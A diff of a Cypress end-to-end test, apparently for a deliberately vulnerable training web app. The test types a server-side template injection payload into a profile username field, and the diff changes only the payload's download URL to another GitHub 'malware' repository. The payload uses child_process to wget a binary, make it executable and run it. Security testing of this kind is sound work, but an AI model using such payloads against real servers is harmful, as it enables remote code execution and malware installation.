@@ -54,7 +54,7 @@ describe('/profile', () => {
         if (!disableOnContainerEnv) {
           cy.visit('/profile')
           cy.get('#username').type(
-            "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
+            "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/logflames/dyno-malware/blob/master/dyno_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
             { parseSpecialCharSequences: false }
           )
           cy.get('#submit').click()
